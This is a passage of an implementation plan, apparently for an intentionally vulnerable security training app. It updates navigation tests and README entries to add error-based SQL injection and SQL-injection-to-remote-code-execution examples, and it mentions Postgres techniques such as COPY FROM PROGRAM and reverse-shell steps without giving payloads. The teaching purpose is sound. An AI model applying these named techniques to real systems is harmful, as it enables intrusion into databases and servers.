Expected: all pass (419 baseline from Task 4 + 4 new = 423).

- [ ] **Step 8: Commit**

```bash
git add app/categories/a03_injection tests/test_a03_inventory_lookup.py
git commit -m "feat(a03): add sqli-to-rce example"
```

---

## Task 6: Final Integration — Overview/Nav Tests and README

**Files:**
- Modify: `tests/test_a03_overview.py`
- Modify: `README.md`

**Interfaces:**
- Consumes: All five components from Tasks 1–5.

- [ ] **Step 1: Update the nav/grouping tests**

Modify `tests/test_a03_overview.py` — `test_a03_registered_in_nav`'s flat
difficulty list currently reads:

```python
    assert [e.difficulty for e in a03.examples] == [
        "Easy",
        "Medium",
        "Medium",
        "Hard",
        "Hard",
        "Medium",
        "Hard",
        "Hard",
        "Medium",
        "Hard",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
    ]
```

Replace it with (inserting `"Medium"` for `error-based-sqli` after the
existing third `"Medium"` — i.e. after `roster-sort` — and `"Hard"` for
`sqli-to-rce` after the existing `roster-lookup` entry's `"Hard"`, before
`reflected-xss`'s `"Medium"`):

```python
    assert [e.difficulty for e in a03.examples] == [
        "Easy",
        "Medium",
        "Medium",
        "Medium",
        "Hard",
        "Hard",
        "Hard",
        "Medium",
        "Hard",
        "Hard",
        "Medium",
        "Hard",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
    ]
```

`test_a03_examples_grouped_by_vulnerability_subtype`'s SQL Injection group
assertion currently reads:

```python
    assert [e.id for e in grouped[0][1]] == [
        "sqli-login",
        "union-exfiltration",
        "roster-sort",
        "blind-sqli",
        "roster-lookup",
    ]
```

Replace it with:

```python
    assert [e.id for e in grouped[0][1]] == [
        "sqli-login",
        "union-exfiltration",
        "roster-sort",
        "error-based-sqli",
        "blind-sqli",
        "roster-lookup",
        "sqli-to-rce",
    ]
```

Every other assertion in this file (the other five groups' id lists, the
mermaid-diagram test, the group-heading test) is unaffected and must be
left unchanged.

- [ ] **Step 2: Run the overview test file to verify it passes**

Run: `.venv/bin/pytest tests/test_a03_overview.py -v`
Expected: PASS (all tests in this file)

- [ ] **Step 3: Run the full test suite**

Run: `.venv/bin/pytest tests/ -v`
Expected: all pass. Baseline before this plan was 414. This plan's new
tests: 0 (Task 1) + 1 (Task 2) + 0 (Task 3) + 4 (Task 4) + 4 (Task 5) +
0 (Task 6, existing tests only updated, not added) = 9 new tests → 423
total.

- [ ] **Step 4: Update README.md's intro paragraph**

Modify `README.md` — read the current file fresh before editing (its
exact wrapping/wording may have drifted slightly since this plan was
written). The current A03 clause reads:

```
**A03 Injection** (SQL injection auth bypass, UNION-based exfiltration, reflected XSS,
blind time-based SQLi, OS command injection, stored XSS, XXE file disclosure, XXE SSRF),
```

Replace it with (adding the two new example names to the existing
parenthetical list, preserving every existing item):

```
**A03 Injection** (SQL injection auth bypass, UNION-based exfiltration, reflected XSS,
blind time-based SQLi, error-based SQLi, OS command injection, SQL injection escalating
to remote code execution, stored XSS, XXE file disclosure, XXE SSRF),
```

- [ ] **Step 5: Update README.md's category summary table**

Modify `README.md` — the current A03 row reads:

```
| A03 Injection | Implemented | SQLi Auth Bypass (Easy), UNION SQLi Exfiltration (Medium), Reflected XSS (Medium), Blind Time-Based SQLi (Hard), OS Command Injection (Hard), Stored XSS (Hard), XXE File Disclosure (Easy), XXE SSRF (Hard) |
```

Replace it with (adding the two new examples to the existing, already
non-exhaustive list, matching its established format):

```
| A03 Injection | Implemented | SQLi Auth Bypass (Easy), UNION SQLi Exfiltration (Medium), Error-Based SQLi (Medium), Reflected XSS (Medium), Blind Time-Based SQLi (Hard), OS Command Injection (Hard), SQLi to RCE (Hard), Stored XSS (Hard), XXE File Disclosure (Easy), XXE SSRF (Hard) |
```

- [ ] **Step 6: Commit**

```bash
git add tests/test_a03_overview.py README.md
git commit -m "docs(a03): update nav tests and README for the SQLi content expansion"
```

No live browser verification step is needed for this sub-project — every
new/expanded example's portable behavior is fully exercisable and provable
through the real Flask test client against SQLite; every Postgres-only
technique (character-by-character `pg_sleep` extraction, stacked queries,
`COPY FROM PROGRAM`, the `CAST` error leak, and the reverse-shell steps)
was already live-verified against the real running docker-compose stack
during this plan's own spec-writing phase (see the spec's Decisions
section for the exact verification transcripts) — there is nothing further
to verify live for this sub-project.
